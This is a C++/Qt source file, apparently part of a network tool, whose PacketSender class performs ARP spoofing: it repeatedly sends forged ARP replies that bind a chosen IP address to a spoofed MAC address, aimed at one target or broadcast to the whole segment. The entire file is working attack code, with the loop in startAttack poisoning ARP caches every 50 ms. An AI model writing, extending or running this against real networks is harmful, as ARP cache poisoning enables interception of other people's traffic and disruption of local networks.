#include "packet_sender.h"
#include <QNetworkInterface>
#include <arpa/inet.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include "arp_scanner.h"
#include <QDebug>
#include <QRegularExpression>
#include <QThread>

// 增加MAC地址格式验证
bool validateMacFormat(const QString &mac) {
    QRegularExpression regex("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$");
    return regex.match(mac).hasMatch();
}

PacketSender::PacketSender(ArpScanner *arpScanner, QObject *parent)
    : QObject(parent), arpScanner(arpScanner), running(false), handle(nullptr) {}

void PacketSender::startAttack(const QString &interface,
                               const QString &targetIp,
                               const QString &spoofIp,
                               const QString &spoofMac,
                               bool isBroadcast) {
    char errbuf[PCAP_ERRBUF_SIZE];
    running = true;

    // 打开接口时增加详细错误处理
    handle = pcap_open_live(interface.toUtf8().constData(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        emit log(QString("[PCAP Error] %1").arg(errbuf));
        return;
    }

    // MAC地址格式验证
    if (!validateMacFormat(spoofMac)) {
        emit log("[Error] Invalid spoof MAC format");
        pcap_close(handle);
        return;
    }

    // 获取目标MAC（增加重试机制）
    QString targetMac;
    for (int retry = 0; retry < 3; ++retry) {
        targetMac = arpScanner->getTargetMacFromCache(targetIp);
        if (!targetMac.isEmpty()) break;
        QThread::msleep(500);
    }

    if (targetMac.isEmpty()) {
        emit log("[Error] Target MAC resolution failed");
        pcap_close(handle);
        return;
    }

    // MAC地址转换（增加错误处理）
    auto macToBytes = [](const QString &mac) -> QByteArray {
        QString clean = mac;
        clean.remove(QRegularExpression("[^0-9A-Fa-f]"));
        if (clean.length() != 12) return QByteArray();
        return QByteArray::fromHex(clean.toLatin1());
    };

    QByteArray targetMacBytes = macToBytes(targetMac);
    QByteArray spoofMacBytes = macToBytes(spoofMac);
    if (targetMacBytes.isEmpty() || spoofMacBytes.isEmpty()) {
        emit log("[Error] MAC conversion failed");
        pcap_close(handle);
        return;
    }

// 协议字段修正
#pragma pack(push, 1)
    struct arp_packet {
        ether_header eth;
        ether_arp arp;
    };
#pragma pack(pop)

    while (running) {
        arp_packet packet = {};

        // 以太网帧
        if (isBroadcast) {
            memset(packet.eth.ether_dhost, 0xFF, ETHER_ADDR_LEN);
        } else {
            memcpy(packet.eth.ether_dhost, targetMacBytes.constData(), ETHER_ADDR_LEN);
        }
        memcpy(packet.eth.ether_shost, spoofMacBytes.constData(), ETHER_ADDR_LEN);
        packet.eth.ether_type = htons(ETHERTYPE_ARP);

        // ARP头
        packet.arp.arp_hrd = htons(ARPHRD_ETHER);
        packet.arp.arp_pro = htons(ETHERTYPE_IP);
        packet.arp.arp_hln = ETHER_ADDR_LEN;
        packet.arp.arp_pln = 4;
        packet.arp.arp_op = htons(ARPOP_REPLY);

        // 发送方地址
        inet_pton(AF_INET, spoofIp.toUtf8().data(), &packet.arp.arp_spa);
        memcpy(packet.arp.arp_sha, spoofMacBytes.constData(), ETHER_ADDR_LEN);

        // 目标地址
        inet_pton(AF_INET, targetIp.toUtf8().data(), &packet.arp.arp_tpa);
        memcpy(packet.arp.arp_tha, targetMacBytes.constData(), ETHER_ADDR_LEN);

        // 发送数据包（增加详细错误报告）
        int sendResult = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet), sizeof(packet));
        if (sendResult != 0) {
            QString error = QString("[Send Error] Code: %1, Desc: %2")
            .arg(sendResult)
                .arg(pcap_geterr(handle));
            emit log(error);
        }

        QThread::msleep(50); // 优化发送间隔
    }

    pcap_close(handle);
    handle = nullptr;
}

void PacketSender::stopAttack() {
    running = false;
    if (handle) {
        pcap_breakloop(handle);  // 立即停止pcap_loop
        pcap_close(handle);  // 增加关闭超时保护
        handle = nullptr;
    }
    emit log("[Info] Attack terminated");
}
